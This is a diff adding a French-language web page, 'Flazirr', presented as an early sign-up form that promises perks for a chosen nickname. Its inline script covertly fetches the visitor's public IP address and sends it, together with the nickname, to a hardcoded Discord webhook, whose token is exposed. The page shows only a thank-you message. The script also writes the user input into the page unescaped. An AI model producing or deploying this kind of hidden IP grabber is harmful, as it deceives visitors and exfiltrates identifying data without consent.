@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flazirr</title>
+    <link rel="stylesheet" href="./site.css">
+    <link rel="shortcut icon" href="./assets/pirate.png">
+</head>
+<body>
+  <header>
+      <nav class="nav">
+          <div class="logo">
+              <a href="./index.html" class="logo">Flazirr</a>
+          </div>
+          <div class="login-button">
+              <a href="#" class="login-button">Ne clique pas !</a>
+          </div>
+      </nav>
+  </header>
+  <section class="landing">
+      <div class="box">
+          <h2 id="h2">Inscris toi parmi les 5 premiers pour avoir des avantages sur le futur site !</h2>
+          <p id="entry">Entrez votre pseudo a afficher :</p>
+          <div class="form-container">
+              <input type="text" id="pseudo-input" placeholder="Votre pseudo a afficher" style="text-decoration: underline;">
+              <button id="submit-btn">Valider</button>
+          </div>
+          <div id="output"></div>
+      </div>
+  </section>
+  <footer>
+      <p class="copy"> Copywrite &copy; 2023 Flazirr. </p>
+  </footer>
+  
+  <script>
+    // Fonction pour envoyer une requête POST à un webhook Discord
+    function sendWebhook(webhookUrl, data) {
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data),
+      })
+        .then(response => {
+          if (response.ok) {
+            console.log('Données envoyées avec succès!');
+          } else {
+            console.error('Une erreur s\'est produite lors de l\'envoi des données.');
+          }
+        })
+        .catch(error => {
+          console.error('Une erreur s\'est produite lors de l\'envoi des données.', error);
+        });
+    }
+  
+    // Fonction appelée lors de la soumission du formulaire
+    function handleSubmit(event) {
+      event.preventDefault();
+      const pseudoInput = document.getElementById('pseudo-input');
+      const pseudo = pseudoInput.value;
+  
+      // Vérifier si quelque chose a été entré dans l'input
+      if (pseudo.trim() === '') {
+        alert('Veuillez entrer un pseudo obligatoirement.');
+        return;
+      }
+  
+      // Récupérer l'adresse IP de l'utilisateur
+      fetch('https://api.ipify.org/?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+  
+          // Afficher un message de remerciement avec le pseudo
+          const outputDiv = document.getElementById('output');
+          outputDiv.innerHTML = `Merci, votre inscription sera prise en compte dans peu de temps, ${pseudo} !`;
+  
+          // Envoyer l'IP et le pseudo sur le webhook Discord
+          const webhookUrl = 'https://discord.com/api/webhooks/1070267757486166087/JVLJmhMCsLIShQZLSFhNGQWmQoPX8TmWh5W8oeSoKs1SYaT6rNDbnX4lfrnsb2W5OGGe';
+          const webhookData = {
+            content: `IP: ${ip}\nPseudo: ${pseudo}`,
+          };
+          sendWebhook(webhookUrl, webhookData);
+        })
+        .catch(error => {
+          console.error('Une erreur s\'est produite lors de la récupération de l\'adresse IP.', error);
+        });
+    }
+  
+    const submitBtn = document.getElementById('submit-btn');
+    submitBtn.addEventListener('click', handleSubmit);
+  </script>  
+
+</body>
+</html>
